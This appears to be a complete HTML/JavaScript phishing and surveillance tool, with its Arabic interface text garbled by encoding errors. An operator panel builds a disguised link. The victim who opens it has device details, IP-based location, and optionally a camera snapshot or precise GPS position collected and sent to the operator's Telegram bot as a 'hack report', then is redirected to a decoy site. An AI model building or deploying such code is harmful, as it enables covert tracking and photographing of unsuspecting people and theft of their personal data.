<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>G-INTEL v3.0</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
    <style>
        :root { --red: #ff0000; --dark: #0a0a0a; }
        body { background-color: var(--dark); color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .container { width: 90%; max-width: 450px; background: #151515; padding: 25px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(255,0,0,0.1); }
        h2 { color: var(--red); text-align: center; border-bottom: 2px solid var(--red); padding-bottom: 10px; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #444; color: #fff; border-radius: 8px; outline: none; box-sizing: border-box; }
        .btn { background: var(--red); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        #outputArea { display: none; margin-top: 20px; padding: 10px; border: 1px dashed var(--red); background: #000; }
        textarea { width: 100%; height: 60px; background: transparent; color: #ff4d4d; border: none; resize: none; font-size: 12px; outline: none; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div id="adminPanel" class="container">
    <h2>Ù…Ø±ÙƒØ² Ø§Ù„Ø¹Ù…Ù„ÙŠØ§Øª v3</h2>
    <input type="text" id="botToken" placeholder="ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª">
    <input type="text" id="chatId" placeholder="Ø§Ù„Ø£ÙŠØ¯ÙŠ (Chat ID)">
    <select id="hackMode">
        <option value="info">Ø³Ø­Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² (ØµØ§Ù…Øª)</option>
        <option value="camera">Ø³Ø­Ø¨ ØµÙˆØ±Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (Ø¥Ø°Ù†)</option>
        <option value="gps">Ø³Ø­Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¯Ù‚ÙŠÙ‚ GPS (Ø¥Ø°Ù†)</option>
    </select>
    <input type="text" id="targetUrl" placeholder="Ø±Ø§Ø¨Ø· Ø§Ù„ØªØ­ÙˆÙŠÙ„ (Ù…Ø«Ù„Ø§Ù‹ https://google.com)">
    <button class="btn" onclick="buildPayload()">Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø·</button>

    <div id="outputArea">
        <p style="font-size: 12px;">Ø§Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø· ÙˆØ§Ø®ØªØµØ±Ù‡:</p>
        <textarea id="finalUrl" readonly></textarea>
    </div>
</div>

<video id="v" autoplay playsinline class="hidden"></video>
<canvas id="c" class="hidden"></canvas>

<script>
    const params = new URLSearchParams(window.location.search);

    if (params.has('m')) {
        document.getElementById('adminPanel').classList.add('hidden');
        const config = JSON.parse(atob(params.get('m')));
        executeCapture(config);
    }

    async function executeCapture(config) {
        const parser = new UAParser();
        const ua = parser.getResult();
        
        // 1. Ù…Ø­Ø§ÙˆÙ„Ø© Ø¬Ù„Ø¨ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©
        let batteryInfo = "ØºÙŠØ± Ù…ØªØ§Ø­";
        try {
            const b = await navigator.getBattery();
            batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'ÙŠÙØ´Ø­Ù†' : 'Ù„Ø§ ÙŠÙØ´Ø­Ù†'})`;
        } catch(e){}

        // 2. Ø¬Ù„Ø¨ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù€ IP ÙˆØ§Ù„Ù…Ø¯ÙŠÙ†Ø© Ø¨Ø¯Ù‚Ø© Ø£Ø¹Ù„Ù‰
        let net = {};
        try {
            const res = await fetch('https://ipapi.co/json/');
            net = await res.json();
        } catch(e){
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ø¯ÙŠÙ„Ø© ÙÙŠ Ø­Ø§Ù„ ÙØ´Ù„ Ø§Ù„Ø®Ø¯Ù…Ø© Ø§Ù„Ø£ÙˆÙ„Ù‰
            try {
                const res2 = await fetch('https://api.ipify.org?format=json');
                const data2 = await res2.json();
                net.ip = data2.ip;
            } catch(e2){}
        }

        // 3. Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ØªÙ‚Ù†ÙŠØ© Ø¥Ø¶Ø§ÙÙŠØ© (Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬ ÙˆØ§Ù„Ø°Ø§ÙƒØ±Ø©)
        const cpuCores = navigator.hardwareConcurrency || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        const ram = navigator.deviceMemory || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

        // ØªØ¬Ù‡ÙŠØ² Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù…Ø¹Ø±Ø¨
        const report = `
ğŸš¨ **ØªÙ‚Ø±ÙŠØ± Ø§Ø®ØªØ±Ø§Ù‚ Ø¬Ø¯ÙŠØ¯ [${config.type.toUpperCase()}]**
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“± **Ø§Ù„Ù…Ø§Ø±ÙƒØ©:** ${ua.device.vendor || 'ÙƒÙ…Ø¨ÙŠÙˆØªØ±/ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
ğŸ› ï¸ **Ø§Ù„Ù…ÙˆØ¯ÙŠÙ„:** ${ua.device.model || 'Ø·Ø±Ø§Ø² ØºÙŠØ± Ù…Ø­Ø¯Ø¯'}
ğŸ’» **Ø§Ù„Ù†Ø¸Ø§Ù…:** ${ua.os.name} ${ua.os.version}
ğŸŒ **Ø§Ù„Ù…ØªØµÙØ­:** ${ua.browser.name}
ğŸ”‹ **Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:** ${batteryInfo}
âš™ï¸ **Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬:** ${cpuCores} Ø£Ù†ÙˆÙŠØ©
ğŸ§  **Ø§Ù„Ø±Ø§Ù…:** ${ram} Ø¬ÙŠØ¬Ø§

ğŸŒ **Ø§Ù„Ø´Ø¨ÙƒØ© ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹:**
â€¢ **Ø§Ù„Ù€ IP:** \`${net.ip || 'Ù…Ø®ÙÙŠ'}\`
â€¢ **Ø§Ù„Ø¯ÙˆÙ„Ø©:** ${net.country_name || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
â€¢ **Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©:** ${net.city || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
â€¢ **Ø§Ù„Ø´Ø±ÙƒØ©:** ${net.org || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}

â° **Ø§Ù„ÙˆÙ‚Øª:** ${new Date().toLocaleString('ar-EG')}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        `;

        // Ø¯Ø§Ù„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹ Ø§Ù†ØªØ¸Ø§Ø± (Await) Ù„Ø¶Ù…Ø§Ù† Ø§Ù„ÙˆØµÙˆÙ„
        const sendToTelegram = async (msg) => {
            return fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: config.chat, text: msg, parse_mode: 'Markdown' })
            });
        };

        if (config.type === 'info') {
            await sendToTelegram(report);
            setTimeout(() => window.location.replace(config.url), 500);
        } 
        else if (config.type === 'camera') {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v');
                video.srcObject = stream;
                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(async blob => {
                        await sendToTelegram(report);
                        const fd = new FormData();
                        fd.append('chat_id', config.chat);
                        fd.append('photo', blob, 'shot.jpg');
                        await fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, { method: 'POST', body: fd });
                        stream.getTracks().forEach(t => t.stop());
                        window.location.replace(config.url);
                    }, 'image/jpeg');
                }, 1000);
            } catch (e) {
                await sendToTelegram(report + "\nâš ï¸ (ØªÙ… Ø±ÙØ¶ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§)");
                window.location.replace(config.url);
            }
        }
        else if (config.type === 'gps') {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const gpsText = `ğŸ“ **Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¯Ù‚ÙŠÙ‚ (GPS):**\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await sendToTelegram(report + "\n" + gpsText);
                window.location.replace(config.url);
            }, async () => {
                await sendToTelegram(report + "\nâš ï¸ (ØªÙ… Ø±ÙØ¶ Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ GPS)");
                window.location.replace(config.url);
            }, {enableHighAccuracy: true});
        }
    }

    function buildPayload() {
        const token = document.getElementById('botToken').value;
        const chat = document.getElementById('chatId').value;
        const type = document.getElementById('hackMode').value;
        const url = document.getElementById('targetUrl').value;

        if(!token || !chat || !url) return alert("Ø£ÙƒÙ…Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„!");

        const data = { token, chat, type, url };
        const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
        const final = window.location.origin + window.location.pathname + "?m=" + encoded;

        document.getElementById('finalUrl').value = final;
        document.getElementById('outputArea').style.display = 'block';
    }
</script>
</body>
</html>
